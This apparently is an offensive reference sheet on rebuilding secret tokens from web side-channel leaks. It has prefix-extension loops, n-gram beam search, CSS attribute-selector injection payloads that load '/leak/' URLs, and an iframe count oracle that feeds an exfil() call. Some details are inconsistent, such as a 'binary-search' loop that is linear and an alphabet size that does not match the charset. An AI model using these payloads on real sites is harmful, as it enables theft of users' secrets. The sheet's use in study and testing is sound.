# Reconstruction deep — assembling the secret from the leak

Every secret-assembly pattern, by channel type.

---

## 1. The binary-search boolean oracle — extend one char at a time

```python
charset='abcdefghijklmnopqrstuvwxyz0123456789'
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c):   # does the secret start with known+c?
            known+=c; break
```

```text
a hit/miss oracle (a 200/404, an onload/onerror) — 'does the secret
start with X' — extend the known prefix one char at a time. a
32-char secret × a 62-char alphabet = up to 1984 queries — the
feasibility arithmetic matters.
```

## 2. The char-set oracle — the sorted-secret direct answer

```python
# a sorted secret's character-set fully determines it
token=''.join(sorted(leaked_chars))
```

```text
'take N random chars, sort them' → the set IS the string — a
char-set oracle (a @font-face unicode-range) returns the answer
directly. no ordering work needed.
```

## 3. The n-gram beam search — an unsorted secret

```python
def beam(ngrams,w=10,L=32):
    beam=[('',0.)]
    for _ in range(L):
        cand=[]
        for s,sc in beam:
            for ng in ngrams:
                if ng[:-1]==s[-len(ng)+1:]:
                    cand.append((s+ng[-1],sc+score(ng)))
        beam=sorted(cand,key=lambda x:-x[1])[:w]
    return beam[0][0]
```

```text
an unsorted secret's char-set doesn't order it — a set of n-grams
(each a substring the channel confirmed) stitches into the secret
via a beam search — keep the top-W candidates at each extension.
a gap in the n-gram coverage is a dead end — widen the marker set.
```

## 4. The substring oracle — the n-gram leak

```css
/* a substring oracle — 'does X occur' — queried over all n-grams */
body[secret*="abc"]{--m_abc:url('/leak/abc')}
```

```text
a CSS substring-selector oracle — 'does the secret contain "abc"' —
queried over all 1/2/3-grams of the alphabet — the matched set is
the n-gram coverage the beam search stitches.
```

## 5. The prefix+suffix oracle — the bidirectional extend

```css
body[secret^="ab"]{--m_ab:url('/leak/prefix-ab')}
body[secret$="ef"]{--m_ef:url('/leak/suffix-ef')}
```

```text
a prefix oracle extends the head; a suffix oracle extends the tail —
a bidirectional extend covers the secret from both ends.
```

## 6. The count oracle — a length-first read

```js
// a count oracle reads the result count — a length first
var f=document.createElement('iframe');
f.src='https://t/search?q='+g;
f.onload=()=>exfil('count='+f.contentWindow.frames.length);
```

```text
a count oracle (frames.length) reads the result count — a length-
first read narrows the secret's length before the char-by-char.
```

## 7. The position oracle — a per-position read

```css
/* a position oracle — 'does the secret have X at position N' */
/* a char-at-position read — a positional alphabet probe */
```

```text
a position-aware oracle (a char at a known offset) — a per-position
read skips the ordering work — the alphabet probe at each position.
```

## 8. The noisy-channel reconstruction — a beam search + a confidence

```python
# a noisy channel's top candidate isn't always right — a beam search
# over a noisy set needs a confidence check + a verify step
```

```text
a noisy channel (a timing oracle, a recency read) — the top
candidate isn't always right — score each candidate's confidence;
submit the top one and verify acceptance.
```

## 9. The one-bit channel — N queries for a multi-bit secret

```text
a channel that carries ONE bit can't read a multi-bit secret
directly — each query reads one bit. a 32-char secret needs ~N
queries — the feasibility arithmetic matters (a 1-bit channel × a
rate cap = an infeasible leak).
```

## 10. The high-bandwidth channel — a whole char-set per visit

```text
a recency/LRU channel carries thousands of bits; a CSS oracle's one
load carries a whole char-set — the channel's bandwidth determines
the visit count — a high-bandwidth channel needs far fewer visits
than a one-bit one.
```

## The per-secret reconstruction-selection

```text
a sorted secret + a char-set oracle   → sort the set — the answer
an unsorted secret + a char-set oracle → an n-gram beam search
a boolean oracle                      → a binary-search extend
a count oracle                        → a length-first + a char-by-char
a position oracle                     → a per-position alphabet probe
a noisy channel                       → a beam + a confidence + a verify
a one-bit channel                     → N queries — check feasibility
```

## The verify step — the confirm standard

```python
# the reconstructed secret is a CANDIDATE until verified:
# - submit it → confirm acceptance
# - check the confidence score clears a threshold
```

```text
the channel is the means; the verified secret is the confirm. a
reconstructed token that doesn't verify is a candidate, not the
answer.
```
